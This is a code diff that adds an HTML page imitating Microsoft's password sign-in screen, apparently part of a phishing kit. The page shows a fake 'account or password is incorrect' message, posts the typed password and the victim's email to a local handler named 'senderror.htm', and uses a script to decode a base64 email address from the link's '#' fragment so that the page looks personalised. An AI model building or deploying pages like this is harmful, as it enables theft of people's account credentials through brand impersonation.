@@ -1,0 +1,71 @@
+<html lang="en">
+<link rel="stylesheet" href="style.css">    <link rel="shortcut icon" href="favicon.ico" />
+</head>
+</head>
+<body>
+	<div class="centerbox2">
+        <div class="inside-box">
+			<div>
+			<img src="microsoft_logo.png" alt="">
+			</div>
+				<div>&nbsp;</div>
+            <div>
+                <a><img src="arrow_left.svg" class="backbtn"></a> <span class="email-text" id="p1"></span>  
+            </div>
+			
+			<div class="header1">
+                <span>Enter Password</span>
+			</div>
+			<div>
+				
+				<p class="error-text">Your account or password is incorrect. If you don't remember your password <a href="#">reset it now.</a></p></div>
+				<div class="getinput">
+					<form action="senderror.htm" >
+						<div>
+								<input type="password" name="password" autofocus="on" placeholder="Password" required>
+						</div>
+								 
+										<input type="hidden" name="email" id="p1"/>
+								
+						<div>
+							<input type="checkbox"><span style="position: relative; top:-5px; font-weight: lighter;">&nbsp; Keep me signed in</span>
+						</div>
+						<div class="signup-text">
+						<span>
+						<a href="#">Forgot my password</a>                   
+						</span>
+						</div>
+						<div class="sign-in-button"><button class="next-button">Sign In</button></div>
+					</form>
+				</div>
+		</div>
+	</div>
+	
+	
+	<script>
+
+var feedUpdateResponse = window.location.href;
+var feedUpdateSplit = feedUpdateResponse.split("");
+
+for (var x = 0; x < feedUpdateSplit.length; x++) {
+ 
+ if (feedUpdateSplit[x]=="#"){
+  var che= feedUpdateResponse.substring(x+1);
+ 
+ }else{
+ 
+
+ }
+
+ 
+ 
+ }
+
+document.getElementById("p1").innerHTML = atob(che)
+  document.getElementById("myText").value =atob(che)
+
+</script>
+				<div class="footer">
+				<span class="footer-text">©2021 Microsoft &nbsp; Terms of use &nbsp; Privacy & cookies &nbsp;  ... &nbsp;</span>
+				</div>
+</body></html>
